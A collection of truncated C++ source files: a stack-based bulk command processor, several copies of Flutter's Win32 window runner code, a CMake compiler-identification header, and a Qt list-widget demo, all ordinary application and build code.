    "/// @brief This module contains command processing\r\n/// and the main function\r\n\r\n#include \"model.h\"\r\n#include \"inout.h\"\r\n#include <utility>\r\n#include <stack>\r\n\r\n/// @brief A type for lexemas: Enum + string\r\nusing lexema_t = std::pair<enum Lex, std::string>;\r\n\r\n/// @brief The command stack\r\n/// is used here for convenient creation and deletion of command blocks\r\n/// stack depth is <= 1\r\nusing bulks_t = std::stack<bulk_t>;\r\n\r\n/// @brief Global variable for size of \"static\" bulks\r\nint bulk_size = 0;\r\n\r\n/// @brief Returns next lexema from input\r\n/// @return std::pair<enum Lex, std::string>\r\nlexema_t next_lexema()\r\n{\r\n    std::string buf;\r\n\r\n    c_get_line(buf);\r\n\r\n    if (c_eof())\r\n        return std::make_pair(EndOfInput, std::string(\"\"));\r\n    if (buf.find('{') != buf.npos)\r\n        return std::make_pair(OpenBr, std::string(\"{\"));\r\n    if (buf.find('}') != buf.npos)\r\n        return std::make_pair(CloseBr, std::string(\"}\"));\r\n    return std::make_pair(Cmd, buf);\r\n}\r\n\r\n/// @brief The main automate to process commands\r\n/// @param bulks - one level stack of command bulks\r\nvoid proceed(bulks_t &bulks)\r\n{\r\n    // Set initial state\r\n    bulks.push(bulk_t(clock(), StartOfStatic, bulk_size));\r\n    int is_dynamic = 0;\r\n\r\n    while (true)\r\n    {\r\n        auto lexema = next_lexema();\r\n        int lexlex = lexema.first; // first: lexema enum,\r\n                                   // second: command string, if any, or \"\"\r\n\r\n        switch (lexlex)\r\n        {\r\n        case OpenBr:          // '{'\r\n            if (is_dynamic++) // nested '{' are only accounted\r\n                break;\r\n            output_bulk(bulks.top());\r\n\r\n            // destroys the old cmd bulk\r\n            bulks.pop();\r\n\r\n            // Creates & constructs new cmd bulk header\r\n            bulks.push(bulk_t(clock(), OpenBr, 0));\r\n            break;\r\n        case CloseBr:         // '}'\r\n            if (--is_dynamic) // checks for nesting level\r\n                break;\r\n            output_bulk(bulks.top());\r\n            bulks.pop();\r\n            bulks.push(bulk_t(clock(), StartOfStatic, bulk_size));\r\n            break;\r\n        case Cmd: // command\r\n            bulks.top().cmds.emplace_back(lexema.second);\r\n\r\n            // for dynamic bulks target_size is 0, for static ones - is equal to bulk_size\r\n            if (bulks.top().cmds.size() == bulks.top().target_size)\r\n            {\r\n                output_bulk(bulks.top());\r\n                bulks.pop();\r\n                bulks.push(bulk_t(clock(), StartOfStatic, bulk_size));\r\n            }\r\n            break;\r\n        case EndOfInput: // ^D\r\n            if (bulks.top().lex == OpenBr)\r\n                return;\r\n            output_bulk(bulks.top());\r\n            return;\r\n        };\r\n    }\r\n}\r\n\r\n/// @brief Just a main proc\r\n/// @param argc is not used, because the param number is known to be 1\r\n/// @param argv nof commands in a bulk, is stored into a global var bulk_size\r\n/// @return zero\r\nint main([[maybe_unused]] int argc, char *argv[])\r\n{\r\n    bulks_t bulks;\r\n    bulk_size = std::atoi(argv[1]);\r\n    proceed(bulks);\r\n    return 0;\r\n}",
    "// Copyright 2014 The Flutter Authors. All rights reserved.\n// Use of this source code is governed by a BSD-style license that can be\n// found in the LICENSE file.\n\n#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n    FreeLibrary(user32_module);\n  }\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n      ",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(",
    "#include \"win32_window.h\"\n\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n    FreeLibrary(user32_module);\n  }\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::CreateAndShow(const std::wstring& title,\n                                const Point& origin,\n                                const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW | WS_VISIBLE,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  return OnCreate();\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    SetWindowLongPtr(window, GWLP_USERDATA,\n                     reinterpret_cast<LONG_PTR>(window_struct->lpCreateParams));\n\n    auto that = static_cast<Win32Window*>(window_struct->lpCreateParams);\n    EnableFullDpiSupportIfAvailable(window);\n    that->window_handle_ = window;\n  } else if (Win32Window* that = GetThisFromHandle(window)) {\n    return that->MessageHandler(window, message, wparam, lparam);\n  }\n\n  return DefWindowProc(window, message, wparam, lparam);\n}\n\nLRESULT\nWin32Window::MessageHandler(HWND hwnd,\n                            UINT const message,\n                            WPARAM const wparam,\n                            LPARAM const lparam) noexcept {\n  switch (message) {\n    case WM_DESTROY:\n      window_handle_ = nullptr;\n      Destroy();\n      if (quit_on_close_) {\n        PostQuitMessage(0);\n  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sample\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"listwidget.h\"\r\n#include \"ui_listwidget.h\"\r\n#include <QHBoxLayout>\r\n#include <QVBoxLayout>\r\n#include <QInputDialog>\r\n\r\nListWidget::ListWidget(QWidget *parent)\r\n    : QWidget(parent)\r\n    , ui(new Ui::ListWidget)\r\n{\r\n    ui->setupUi(this);\r\n    setFixedHeight(600);\r\n    QHBoxLayout *hbox = new QHBoxLayout(this);\r\n    lw1 = new QListWidget(this);\r\n\r\n    lw1->setDropIndicatorShown(true);\r\n    lw1->setDragEnabled(true);\r\n    lw1->setDragDropOverwriteMode(true);\r\n    lw1->setDragDropMode(QAbstractItemView::DragDrop);\r\n    lw1->setDefaultDropAction(Qt::TargetMoveAction);\r\n\r\n    QListWidgetItem* item1 = new QListWidgetItem(\"a1\");\r\n    item1->setIcon(QIcon(\"notebook.png\"));\r\n    lw1->addItem(item1);\r\n    QListWidgetItem* item2 = new QListWidgetItem(\"a2\");\r\n    item2->setIcon(QIcon(\"notebook.png\"));\r\n    lw1->addItem(item2);\r\n    QListWidgetItem* item3 = new QListWidgetItem(\"a3\");\r\n    item3->setIcon(QIcon(\"notebook.png\"));\r\n    lw1->addItem(item3);\r\n    //lw1->addItem(\"a1\");\r\n    //lw1->addItem(\"b1\");\r\n    //lw1->addItem(\"c1\");\r\n    int n1 = lw1->count() - 1;\r\n    lw1->setCurrentRow(n1);\r\n    add1 = new QPushButton(\"Add\", this);\r\n    rename1 = new QPushButton(\"Rename\", this);\r\n    remove1 = new QPushButton(\"Remove\", this);\r\n    removeAll1 = new QPushButton(\"Remove All\", this);\r\n    QVBoxLayout *vbox1 = new QVBoxLayout();\r\n    QGridLayout *grid1 = new QGridLayout();\r\n    //grid1->setSpacing(20); //////\r\n    grid1->addWidget(add1, 0, 0);\r\n    grid1->addWidget(rename1, 0, 1);\r\n    grid1->addWidget(remove1, 1, 0);\r\n    grid1->addWidget(removeAll1, 1, 1);\r\n    vbox1->addWidget(lw1);\r\n    vbox1->addLayout(grid1);\r\n    selectionMode1 = new QPushButton(\"Enable multiselection\", this);\r\n    vbox1->addWidget(selectionMode1);\r\n    sort1 = new QPushButton(\"Sort\", this);\r\n    vbox1->addWidget(sort1);\r\n\r\n    lw2 = new QListWidget(this);\r\n    QListWidgetItem* item4 = new QListWidgetItem(\"b1\");\r\n    item4->setIcon(QIcon(\"notebook.png\"));\r\n    lw2->addItem(item4);\r\n    QListWidgetItem* item5 = new QListWidgetItem(\"b2\");\r\n    item5->setIcon(QIcon(\"notebook.png\"));\r\n    lw2->addItem(item5);\r\n    QListWidgetItem* item6 = new QListWidgetItem(\"b3\");\r\n    item6->setIcon(QIcon(\"notebook.png\"));\r\n    lw2->addItem(item6);\r\n    //lw2->addItem(\"a2\");\r\n    //lw2->addItem(\"b2\");\r\n    //lw2->addItem(\"c2\");\r\n    int n2 = lw2->count() - 1;\r\n    lw2->setCurrentRow(n2);\r\n    add2 = new QPushButton(\"Add\", this);\r\n    rename2 = new QPushButton(\"Rename\", this);\r\n    remove2 = new QPushButton(\"Remove\", this);\r\n    removeAll2 = new QPushButton(\"Remove All\", this);\r\n    QVBoxLayout *vbox2 = new QVBoxLayout();\r\n    QGridLayout *grid2 = new QGridLayout();\r\n    grid2->addWidget(add2, 0, 0);\r\n    grid2->addWidget(rename2, 0, 1);\r\n    grid2->addWidget(remove2, 1, 0);\r\n    grid2->addWidget(removeAll2, 1, 1);\r\n    vbox2->addWidget(lw2);\r\n    vbox2->addLayout(grid2);\r\n    selectionMode2 = new QPushButton(\"Enable multyselection\", this);\r\n    vbox2->addWidget(selectionMode2);\r\n    sort2 = new QPushButton(\"Sort\", this);\r\n    vbox2->addWidget(sort2);\r\n\r\n    lw2->setDropIndicatorShown(true);\r\n    lw2->setDragEnabled(true);\r\n    lw2->setDragDropOverwriteMode(true);\r\n    lw2->setDragDropMode(QAbstractItemView::DragDrop);\r\n    lw2->setDefaultDropAction(Qt::TargetMoveAction);\r\n\r\n    QVBoxLayout *vbox = new QVBoxLayout();\r\n    moveToRight = new QPushButton(\">\", this);\r\n    moveToLeft = new QPushButton(\"<\", this);\r\n    iconMode = new QPushButton(\"icons\", this);\r\n    vbox->addWidget(moveToRight, Qt::AlignTop, Qt::AlignHCenter); ///\r\n    vbox->addWidget(iconMode);\r\n    vbox->addWidget(moveToLeft, Qt::AlignBottom, Qt::AlignHCenter);\r\n\r\n    hbox->addLayout(vbox1);\r\n    hbox->addLayout(vbox);\r\n    hbox->addLayout(vbox2);\r\n\r\n    connect(add1, &QPushButton::clicked, this, &ListWidget::addItem);\r\n    connect(add2, &QPushButton::clicked, this, &ListWidget::addItem);\r\n    connect(rename1, &QPushButton::clicked, this, &ListWidget::renameItems);\r\n    connect(rename2, &QPushButton::clicked, this, &ListWidget::renameItems);\r\n    connect(remove1, &QPushButton::clicked, this, &ListWidget::removeItems);\r\n    connect(remove2, &QPushButton::clicked, this, &ListWidget::removeItems);\r\n    connect(removeAll1, &QPushButton::clicked, this, &ListWidget::clearItems);\r\n    connect(removeAll2, &QPushButton::clicked, this, &ListWidget::clearItems);\r\n    connect(moveToRight, &QPushButton::clicked, this, &ListWidget::movingToRight);\r\n    connect(moveToLeft, &QPushButton::clicked, this, &ListWidget::movingToLeft);\r\n    connect(iconMode, &QPushButton::clicked, this, &ListWidget::changeIconMode);\r\n    connect(sort1, &QPushButton::clicked, this, &ListWidget::sortListWidget1);\r\n    connect(sort2, &QPushButton::clicked, this, &ListWidget::sortListWidget2);\r\n    connect(selectionMode1, &QPushButton::clicked, this, &ListWidget::changeSelectionMode);\r\n    connect(selectionMode2, &QPushButton::clicked, this, &ListWidget::changeSelectionMode);\r\n    connect(lw1, &QListWidget::itemSelectionChanged, this, &Lis",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = 